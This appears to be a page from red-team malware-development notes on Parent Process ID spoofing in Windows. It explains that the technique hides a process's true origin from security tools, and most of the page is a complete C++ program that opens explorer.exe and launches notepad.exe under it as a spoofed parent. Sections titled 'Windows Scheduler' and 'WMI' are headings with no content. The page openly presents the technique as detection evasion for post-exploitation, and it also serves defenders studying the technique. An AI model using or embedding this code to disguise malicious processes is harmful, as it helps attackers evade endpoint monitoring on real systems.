---
title: PPID Spoofing
category: Maldev-LowPriv Evasaion
order: 2
---

Parent Process ID (PPID) Spoofing technique allows to create a process with a parent process ID that differs from the genuine parent process. By doing so, one can avoid detection by security systems designed to identify post-exploitation activities based on parent-child relationship. PPID Spoofing can effectively "hide" a true origin of a process.

There are different techniques to exploit that technique:

# Classic

The classic techniques consists by creating the new process already with the PPID modified. Thanks to `UpdateProcThreadAttribute` function we can modify it to the desired PPID.

First we need to get the PID from a process.

```cpp
DWORD GetPidByName(const char * pName) {
	PROCESSENTRY32 pEntry;
	HANDLE snapshot;

	pEntry.dwSize = sizeof(PROCESSENTRY32);
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32First(snapshot, &pEntry) == TRUE) {
		while (Process32Next(snapshot, &pEntry) == TRUE) {
			if (_stricmp(pEntry.szExeFile, pName) == 0) {
				return pEntry.th32ProcessID;
			}
		}
	}
	CloseHandle(snapshot);
	return 0;
}
```

![](/rtnotes/images/ppid-spoofing-classic-1.png)

Now we need to initialize and update the process attribute list with the help of `InitializeProcThreadAttributeList` and `UpdateProcThreadAttribute` of the parent process, create a new `STARTUPINFOEX` of the process and set it up to new one.

* [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist)
* [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute)

```cpp
InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST) HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
InitializeProcThreadAttributeList(lpAttributeList, 1, 0, &cbAttributeListSize);

hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, desiredPid);

UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);
info.lpAttributeList = lpAttributeList;

CreateProcess(NULL, (LPSTR) "notepad.exe", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &info.StartupInfo, &processInfo);
```

## Code

```cpp
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>

DWORD GetPidByName(const char * pName) {
	PROCESSENTRY32 pEntry;
	HANDLE snapshot;

	pEntry.dwSize = sizeof(PROCESSENTRY32);
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32First(snapshot, &pEntry) == TRUE) {
		while (Process32Next(snapshot, &pEntry) == TRUE) {
			if (_stricmp(pEntry.szExeFile, pName) == 0) {
				return pEntry.th32ProcessID;
			}
		}
	}
	CloseHandle(snapshot);
	return 0;
}

int main(void) {

	DWORD desiredPid = 0;
	SIZE_T cbAttributeListSize = 0;
	LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList = NULL;
	HANDLE hParentProcess = NULL;
	
	STARTUPINFOEX info = { sizeof(info) };
    PROCESS_INFORMATION processInfo;

	desiredPid = GetPidByName("explorer.exe");
	if(desiredPid == 0){
		desiredPid = GetCurrentProcessId(); //In case of error
	}

	InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
	lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST) HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
	InitializeProcThreadAttributeList(lpAttributeList, 1, 0, &cbAttributeListSize);

	hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, desiredPid);

	UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);
	info.lpAttributeList = lpAttributeList;

	CreateProcess(NULL, (LPSTR) "notepad.exe", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &info.StartupInfo, &processInfo);

	printf("Current PID:\t%d \nParent PID:\t%d \nNewProcess PID:\t%d\n", GetCurrentProcessId(), desiredPid, processInfo.dwProcessId);
	getchar();
	return 0;
}
```

Here we can see a process `notepad.exe` created by `rtnotes.exe` has the parent pid of a different process, in that case `explorer.exe`.

![](/rtnotes/images/ppid-spoofing-classic-2.png)

# Windows Scheduler

# WMI